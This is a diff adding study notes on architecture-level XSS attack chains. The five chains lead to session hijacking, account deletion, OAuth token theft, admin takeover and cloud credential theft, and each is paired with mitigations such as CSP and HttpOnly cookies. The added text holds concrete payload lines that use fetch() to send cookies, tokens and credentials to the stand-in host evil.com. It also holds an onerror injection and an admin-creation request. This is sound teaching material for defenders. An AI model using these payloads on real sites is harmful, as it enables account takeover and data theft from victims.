@@ -885,7 +885,324 @@ But JavaScript needs different escaping:
 
 So encoding must match execution context.
 
-Secure approach:
+
+-> Architecture-level XSS attack chains:
+
+1. Stored XSS → Session Hijacking → Account Takeover
+This is the classic attack chain, but understanding the architecture deeply is important.
+Architecture
+
+                 Internet
+                    │
+                    ▼
+            ┌─────────────────┐
+            │   Web Browser   │
+            │  (Victim User)  │
+            └─────────────────┘
+                    │
+                    │ HTTPS
+                    ▼
+           ┌───────────────────┐
+           │   Web Application │
+           │  Comment Service  │
+           └───────────────────┘
+                    │
+                    ▼
+              ┌───────────┐
+              │ Database  │
+              │ Comments  │
+              └───────────┘
+Attack Flow
+Step 1 — Attacker stores malicious comment
+
+POST /comment
+<script>
+fetch("https://evil.com/steal?cookie="+document.cookie)
+</script>
+Stored in database.
+
+Database
+   │
+   ▼
+<script>fetch(...)</script>
+
+Step 2 — Victim loads page
+Server generates HTML:
+
+<html>
+<body>
+<div class="comment">
+<script>fetch(...)</script>
+</div>
+</body>
+</html>
+Browser parses HTML.
+
+Step 3 — Script executes in trusted origin
+Because the script came from the site, the browser thinks:
+
+Origin = victim-site.com
+The browser security model called Same-Origin Policy allows the script to access session data.
+
+Step 4 — Session cookie stolen
+
+document.cookie
+Example:
+
+session=abc123
+The script sends it to attacker server.
+
+Step 5 — Attacker reuses cookie
+
+GET /account
+Cookie: session=abc123
+Server believes the attacker is the victim.
+Account takeover occurs.
+
+Why this attack works
+Because:
+
+Browser trusts scripts delivered by the website.
+If attackers inject script into the site, the browser cannot distinguish it from legitimate code.
+
+Mitigations
+Important layers:
+	1. Output encoding
+	2. Input sanitization
+	3. Content Security Policy
+	4. HttpOnly cookies
+Example:
+
+Set-Cookie: session=abc123; HttpOnly
+Now JavaScript cannot read the cookie.
+
+2. DOM XSS → Internal API Abuse
+Modern applications rely heavily on browser-side APIs.
+Architecture:
+
+          Browser
+             │
+             ▼
+       Single Page App
+         (JavaScript)
+             │
+             ▼
+        Internal APIs
+             │
+             ▼
+          Database
+
+Attack Setup
+Application code:
+const msg = location.hash;
+document.getElementById("msg").innerHTML = msg;
+
+Attacker sends victim link:
+https://site.com/#<img src=x onerror="fetch('/api/delete-account',{method:'POST'})">
+
+Flow
+Victim opens link.
+Browser
+   │
+   ▼
+JavaScript reads location.hash
+   │
+   ▼
+innerHTML inserts payload
+   │
+   ▼
+Browser executes onerror handler
+
+Now the script runs inside the session.
+
+Internal API Abuse:
+Script sends request:
+POST /api/delete-account
+Cookie: session=xyz
+Browser automatically attaches cookies.
+Server thinks:
+This request came from the victim user.
+Account deleted.
+
+Why this works?
+Because XSS allows the attacker to: execute arbitrary JavaScript which can call any API the user can access.
+
+Mitigation:
+Avoid inserting untrusted input into DOM:
+innerHTML
+
+Use:
+textContent or DOM sanitization.
+
+3. Stored XSS → OAuth Token Theft
+Modern apps often use OAuth login.
+Example providers:
+	• Google
+	• Microsoft
+
+Architecture:
+ Browser
+    │
+    ▼
+ Web App
+    │
+    ▼
+ OAuth Provider
+
+Tokens stored in browser:
+localStorage
+
+Attack Flow:
+Malicious script executes:
+const token = localStorage.getItem("access_token")
+fetch("https://evil.com/?t="+token)
+Token stolen.
+
+Why this is serious?
+OAuth tokens often allow:
+API access
+profile data
+file storage
+cloud resources
+
+Attacker can now call APIs:
+GET /api/user-data
+Authorization: Bearer TOKEN
+User account fully compromised.
+
+Why tokens are accessible?
+Many Single Page Applications store tokens in:
+localStorage
+sessionStorage
+JavaScript can read them.
+So XSS exposes them.
+
+Mitigation:
+Best practice:
+Store tokens in HttpOnly cookies
+Also enforce Content Security Policy.
+
+Example:
+Content-Security-Policy:
+script-src 'self'
+This prevents execution of injected scripts.
+
+4. Stored XSS → Admin Panel Compromise
+Many applications have an admin dashboard.
+Architecture:
+              Internet
+                 │
+                 ▼
+             Web App
+           /          \
+          ▼            ▼
+   User Dashboard   Admin Panel
+
+Attack Setup:
+Attacker posts comment containing script.
+Admin later reviews comments.
+
+Attack Flow:
+Admin opens moderation panel.
+Admin Browser
+      │
+      ▼
+Loads malicious comment
+      │
+      ▼
+Script executes in admin session
+Now attacker script performs admin actions.
+Example:
+fetch("/admin/create-user",{
+ method:"POST",
+ body:"role=admin"
+})
+
+Result:
+Attacker silently creates admin account.
+username: attacker
+role: admin
+
+Why this attack is common?
+Because admin dashboards often display user-generated content. Moderation panels become high-value targets.
+
+Mitigation:
+Separate admin rendering context.
+For example:
+Admin domain: admin.company.com
+User domain: app.company.com
+Now XSS in user content cannot access admin cookies.
+
+5. XSS → Cloud Credential Theft → Infrastructure Compromise
+This is the modern cloud attack chain.
+Architecture:
+ Browser
+    │
+    ▼
+ Web App
+    │
+    ▼
+ Backend API
+    │
+    ▼
+ Cloud Services
+Developers sometimes expose cloud tokens to browser apps.
+Example:
+AWS temporary credentials
+Azure access tokens
+
+Attack Flow:
+Malicious script runs.
+const creds = window.cloudToken
+fetch("https://evil.com/"+creds)
+Attacker obtains token.
+
+Next step:
+Attacker uses cloud CLI:
+aws s3 ls --profile stolen
+Now attacker accesses storage.
+
+Possible actions:
+download data
+modify infrastructure
+deploy malware
+
+Why this happens?
+Because modern apps push logic to the browser.
+Sometimes cloud credentials are temporarily exposed.
+XSS turns that exposure into full compromise.
+
+Mitigation:
+Never expose powerful cloud credentials to browser clients.
+Use:
+short-lived tokens
+least privilege
+backend proxy APIs
+
+Mental Model:
+Remember this pattern:
+XSS
+ │
+ ▼
+Browser execution
+ │
+ ▼
+Session / Token access
+ │
+ ▼
+API abuse
+ │
+ ▼
+Privilege escalation
+ │
+ ▼
+Infrastructure compromise
+
+XSS is not just “popup alert vulnerability.”
+It is: Remote code execution inside the user’s browser session.
+
+
+-> Secure approach:
 Use JSON serialization instead of string concatenation.
 Example safe code:
 <script>
